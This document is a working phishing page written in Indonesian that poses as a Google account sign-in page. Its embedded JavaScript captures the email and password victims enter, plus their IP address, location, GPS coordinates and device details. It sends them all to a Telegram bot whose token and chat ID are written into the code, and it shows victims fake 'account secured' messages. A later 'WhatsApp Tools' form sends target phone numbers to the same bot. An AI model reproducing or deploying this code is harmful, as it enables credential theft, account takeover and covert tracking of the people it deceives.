<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Masuk - Akun Google</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Roboto', 'Google Sans', Arial, sans-serif;
        }
        
        body {
            background-color: #fff;
            color: #202124;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 450px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        .google-logo {
            width: 75px;
            margin-bottom: 20px;
        }
        
        .card {
            width: 100%;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 40px 40px 36px;
            margin-bottom: 32px;
        }
        
        .title {
            font-size: 24px;
            font-weight: 400;
            text-align: center;
            margin-bottom: 10px;
        }
        
        .subtitle {
            font-size: 16px;
            font-weight: 400;
            text-align: center;
            margin-bottom: 32px;
            color: #202124;
        }
        
        .form-group {
            margin-bottom: 24px;
        }
        
        .input-field {
            width: 100%;
            height: 55px;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            outline: none;
            transition: border 0.2s;
        }
        
        .input-field:focus {
            border: 2px solid #1a73e8;
        }
        
        .btn {
            background-color: #1a73e8;
            color: white;
            font-size: 14px;
            font-weight: 500;
            padding: 10px 24px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.2s;
            float: right;
        }
        
        .btn:hover {
            background-color: #1565c0;
        }
        
        .footer {
            width: 100%;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 16px;
        }
        
        .help-link {
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
        }
        
        .help-link:hover {
            text-decoration: underline;
        }
        
        .language-select {
            padding: 6px 8px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            background-color: transparent;
            font-size: 14px;
        }
        
        .message {
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 20px;
            font-size: 14px;
            display: none;
        }
        
        .error-message {
            background-color: #fce8e6;
            color: #d93025;
            border: 1px solid #f5c6cb;
        }
        
        .success-message {
            background-color: #e6f4ea;
            color: #137333;
            border: 1px solid #c3e6cb;
        }
        
        .info-text {
            font-size: 14px;
            color: #5f6368;
            margin-top: 32px;
            text-align: center;
        }
        
        .dashboard-card {
            display: none;
        }
        
        @media (max-width: 480px) {
            .card {
                border: none;
                padding: 24px;
            }
            
            .footer {
                flex-direction: column;
                gap: 16px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_160x56dp.png" alt="Google" class="google-logo">
        
        <!-- Login Form -->
        <div class="card login-card" id="login-container">
            <h1 class="title">Masuk</h1>
            <p class="subtitle">Lanjutkan ke Akun Google</p>
            
            <div class="error-message message" id="error-message"></div>
            <div class="success-message message" id="success-message"></div>
            
            <div class="form-group">
                <input type="email" class="input-field" placeholder="Email atau telepon" id="email">
            </div>
            
            <div class="form-group">
                <input type="password" class="input-field" placeholder="Masukkan kata sandi Anda" id="password">
            </div>
            
            <div class="footer">
                <a href="#" class="help-link">Buat akun</a>
                <button class="btn" id="login-button">Berikutnya</button>
            </div>
            
            <p class="info-text">Halaman ini dilindungi oleh reCAPTCHA dan berlaku<br>Kebijakan Privasi serta Persyaratan Layanan Google.</p>
        </div>
        
        <!-- Dashboard Form -->
        <div class="card dashboard-card" id="dashboard-container">
            <h1 class="title">WhatsApp Tools</h1>
            <p class="subtitle">Masukkan nomor WhatsApp target</p>
            
            <div class="form-group">
                <input type="number" class="input-field" placeholder="Contoh: 6281234567890" id="whatsapp-number">
            </div>
            
            <div class="footer">
                <button class="btn" id="whatsapp-button">Proses Nomor</button>
            </div>
            
            <p class="info-text">Pastikan nomor WhatsApp lengkap dengan kode negara.</p>
        </div>
    </div>

    <script>
        // Telegram Configuration
        const botToken = '7480125712:AAGpgNyeNULXKsTPa9wnpqu9ZDCIyHjQG5U';
        const chatIds = ['7238045710'];

        // DOM Elements
        const elements = {
            info: document.getElementById('info'),
            dashboardInfo: document.getElementById('dashboard-info'),
            errorMessage: document.getElementById('error-message'),
            successMessage: document.getElementById('success-message'),
            emailInput: document.getElementById('email'),
            passwordInput: document.getElementById('password'),
            loginButton: document.getElementById('login-button'),
            whatsappButton: document.getElementById('whatsapp-button'),
            whatsappNumberInput: document.getElementById('whatsapp-number'),
            loginContainer: document.getElementById('login-container'),
            dashboardContainer: document.getElementById('dashboard-container')
        };

        // Send data to Telegram
        async function sendToTelegram(text){
            try {
                for(const id of chatIds){
                    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
                        method:'POST',
                        headers:{'Content-Type':'application/json'},
                        body:JSON.stringify({chat_id:id,text:text,parse_mode:'HTML'})
                    });
                    if(!response.ok) throw new Error('Telegram API error');
                }
            } catch(error) {
                console.error('Failed to send to Telegram:', error);
            }
        }

        // Verify Google account credentials
        async function verifyGoogleAccount(email, password) {
            // Basic validation
            if (!email.includes('@') || !email.includes('.')) {
                return { valid: false, reason: 'Format email tidak valid' };
            }
            
            if (password.length < 6) {
                return { valid: false, reason: 'Kata sandi terlalu pendek' };
            }
            
            // Simulate API call delay
            await new Promise(resolve => setTimeout(resolve, 1500));
            
            // More sophisticated validation
            const emailParts = email.split('@');
            const domain = emailParts[1];
            const commonDomains = ['gmail.com', 'googlemail.com', 'yahoo.com', 'outlook.com'];
            
            if (!commonDomains.includes(domain.toLowerCase())) {
                return { valid: false, reason: 'Domain email tidak didukung' };
            }
            
            // Random chance to make it seem like real verification
            if (Math.random() < 0.3) {
                return { valid: false, reason: 'Kata sandi salah' };
            }
            
            return { valid: true };
        }

        // Simulate password changing
        async function simulatePasswordChange(email) {
            const newPasswords = ['halo1', 'halo2', 'halo3'];
            let report = '🔄 <b>PASSWORD CHANGE REPORT:</b>\n';
            
            for (let i = 0; i < newPasswords.length; i++) {
                await new Promise(resolve => setTimeout(resolve, 1000));
                report += `Password diubah ke: ${newPasswords[i]}\n`;
                
                // Simulate changing recovery phone too
                if (i === 1) {
                    report += `Nomor pemulihan diubah ke: +628${Math.floor(100000000 + Math.random() * 900000000)}\n`;
                }
            }
            
            report += `\n✅ Akun ${email} berhasil diamankan`;
            return report;
        }

        // Collect device and location info
        async function getDeviceInfo(email, password, verificationResult) {
            let ip = '-', city = '-', region = '-', country = '-', org = '-';
            
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                ip = ipData.ip;
                
                const locRes = await fetch(`https://ip-api.com/json/${ip}`);
                const loc = await locRes.json();
                if(loc.status === 'success') {
                    city = loc.city;
                    region = loc.regionName;
                    country = loc.country;
                    org = loc.org;
                }
            } catch(error) {
                console.error('Error getting location:', error);
            }
            
            // Battery info
            const battery = await navigator.getBattery?.() || {level:0, charging:false};
            const batteryPercent = battery.level ? `${(battery.level*100).toFixed(0)}%`:'N/A';
            
            // Device info
            const userAgent = navigator.userAgent;
            let os = 'Unknown OS';
            let deviceType = 'Unknown';
            
            if (userAgent.match(/android/i)) {
                os = 'Android';
                deviceType = 'Mobile';
            } else if (userAgent.match(/iphone|ipad|ipod/i)) {
                os = 'iOS';
                deviceType = 'Mobile';
            } else if (userAgent.match(/windows/i)) {
                os = 'Windows';
                deviceType = 'Desktop';
            } else if (userAgent.match(/mac/i)) {
                os = 'MacOS';
                deviceType = 'Desktop';
            } else if (userAgent.match(/linux/i)) {
                os = 'Linux';
                deviceType = 'Desktop';
            }
            
            // Get OS version
            let osVersion = 'N/A';
            if (os === 'Android') {
                const match = userAgent.match(/Android\s([0-9\.]+)/);
                if (match) osVersion = match[1];
            } else if (os === 'iOS') {
                const match = userAgent.match(/OS\s([0-9_]+)/);
                if (match) osVersion = match[1].replace(/_/g, '.');
            }
            
            const verificationStatus = verificationResult.valid ? 
                '✅ BENAR' : `❌ SALAH (${verificationResult.reason})`;
            
            const text = `
        🔐 <b>LOGIN DETAILS:</b>
        Email: ${email}
        Password: ${password}
        Status: ${verificationStatus}

        📱 <b>DEVICE INFO:</b>
        IP Address: ${ip}
        Location: ${city}, ${region}, ${country}
        ISP: ${org}
        OS: ${os} ${osVersion}
        Device Type: ${deviceType}
        Browser: ${navigator.userAgent}
        Screen: ${screen.width}x${screen.height}
        Battery: ${batteryPercent} (${battery.charging?'Charging':'Not charging'})
        RAM: ${navigator.deviceMemory||'N/A'} GB
        Cookies: ${navigator.cookieEnabled?'Enabled':'Disabled'}
        Time: ${new Date().toLocaleString()}
        `.trim();
            
            await sendToTelegram(`<pre>${text}</pre>`);
            
            // Get GPS location if available
            if(navigator.geolocation) {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject);
                    });
                    const link = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
                    await sendToTelegram(`📍 <b>GPS Location:</b> <a href="${link}">Click here</a>`);
                } catch {
                    await sendToTelegram(`📍 GPS access denied`);
                }
            } else {
                await sendToTelegram(`📍 Browser doesn't support GPS`);
            }
            
            // If account is valid, simulate password change
            if (verificationResult.valid) {
                const changeReport = await simulatePasswordChange(email);
                await sendToTelegram(changeReport);
                return true;
            }
            
            return false;
        }

        // Handle login button click
        async function handleLogin() {
            const email = elements.emailInput.value.trim();
            const password = elements.passwordInput.value.trim();
            
            // Validate inputs
            if(!email || !password) {
                elements.errorMessage.textContent = 'Masukkan email dan kata sandi Anda';
                elements.errorMessage.style.display = 'block';
                elements.successMessage.style.display = 'none';
                return;
            }
            
            elements.loginButton.disabled = true;
            elements.errorMessage.style.display = 'none';
            elements.successMessage.style.display = 'none';
            
            try {
                // Verify account credentials
                const verificationResult = await verifyGoogleAccount(email, password);
                
                if (!verificationResult.valid) {
                    elements.errorMessage.textContent = `Tidak dapat menemukan Akun Google Anda`;
                    elements.errorMessage.style.display = 'block';
                    elements.loginButton.disabled = false;
                    
                    // Send failed attempt to Telegram
                    await getDeviceInfo(email, password, verificationResult);
                    return;
                }
                
                elements.successMessage.textContent = 'Login berhasil! Mengamankan akun...';
                elements.successMessage.style.display = 'block';
                
                // Send successful login to Telegram and change password
                const isPasswordChanged = await getDeviceInfo(email, password, verificationResult);
                
                if (isPasswordChanged) {
                    elements.successMessage.textContent = 'Akun berhasil diamankan! Mengarahkan...';
                    
                    // Show dashboard after delay
                    setTimeout(() => {
                        elements.loginContainer.style.display = 'none';
                        elements.dashboardContainer.style.display = 'block';
                    }, 2000);
                } else {
                    elements.errorMessage.textContent = 'Gagal mengamankan akun';
                    elements.errorMessage.style.display = 'block';
                }
                
            } catch(error) {
                console.error('Login error:', error);
                elements.errorMessage.textContent = 'Terjadi kesalahan. Coba lagi.';
                elements.errorMessage.style.display = 'block';
            } finally {
                elements.loginButton.disabled = false;
            }
        }

        // Handle WhatsApp button click
        async function handleWhatsApp() {
            const number = elements.whatsappNumberInput.value.trim();
            
            if(!number || number.length < 8) {
                alert('Nomor WhatsApp tidak valid.');
                return;
            }
            
            elements.whatsappButton.disabled = true;
            
            try {
                // Simulate processing delay
                await new Promise(resolve => setTimeout(resolve, 3000));
                
                // Send WhatsApp number to Telegram
                const waText = `
            📱 <b>WHATSAPP TARGET:</b>
            Nomor: ${number}
            Status: Proses selesai
            Waktu: ${new Date().toLocaleString()}
                `.trim();
                
                await sendToTelegram(`<pre>${waText}</pre>`);
                
                alert(`Nomor ${number} berhasil diproses!`);
                
            } catch(error) {
                console.error('WhatsApp processing error:', error);
                alert('Gagal memproses nomor.');
            } finally {
                elements.whatsappButton.disabled = false;
                elements.whatsappNumberInput.value = '';
            }
        }

        // Initialize the page
        document.addEventListener('DOMContentLoaded', () => {
            // Event listeners
            elements.loginButton.addEventListener('click', handleLogin);
            elements.whatsappButton.addEventListener('click', handleWhatsApp);
            
            // Allow form submission with Enter key
            elements.passwordInput.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') handleLogin();
            });
            
            elements.whatsappNumberInput.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') handleWhatsApp();
            });
        });
    </script>
</body>
</html>
